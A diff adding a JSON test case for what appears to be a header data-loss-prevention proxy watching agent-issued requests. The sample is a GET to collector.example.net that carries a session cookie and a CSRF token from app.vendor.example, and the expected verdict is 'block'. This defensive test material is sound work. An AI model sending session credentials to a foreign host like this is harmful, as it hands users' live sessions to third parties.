@@ -1,0 +1,25 @@
+{
+  "schema_version": 4,
+  "id": "header-dlp-cookie-foreign-origin-011",
+  "category": "headers",
+  "title": "Session cookie attached to a request for a foreign origin",
+  "description": "A session cookie scoped to one application is attached to a request sent to an unrelated host, so a live session credential crosses an origin boundary a browser would have enforced.",
+  "input_type": "header",
+  "transport": "fetch_proxy",
+  "payload": {
+    "method": "GET",
+    "url": "https://collector.example.net/collect?src=dashboard",
+    "headers": {
+      "Cookie": "session_id=abc123def456; csrf_token=9f2b7c1e4a; theme=dark",
+      "Referer": "https://app.vendor.example/dashboard"
+    }
+  },
+  "expected_verdict": "block",
+  "severity": "high",
+  "capability_tags": ["header_dlp"],
+  "requires": ["header_dlp_scanning"],
+  "false_positive_risk": "medium",
+  "why_expected": "session_cookie_sent_to_foreign_origin",
+  "notes": "Pairs with header-benign-cookies-002, which allows the same cookie shape because a session cookie returned to its own origin is ordinary traffic. A cookie is a bearer credential, so the discriminator is again destination rather than shape: the Referer places the session at app.vendor.example and the request targets collector.example.net. An agent is not a browser and applies no same-origin rule of its own, which is why this crossing has to be caught at the proxy.",
+  "source": "RFC 6265 cookie scope; session credential leaving its origin through an agent-issued request"
+}
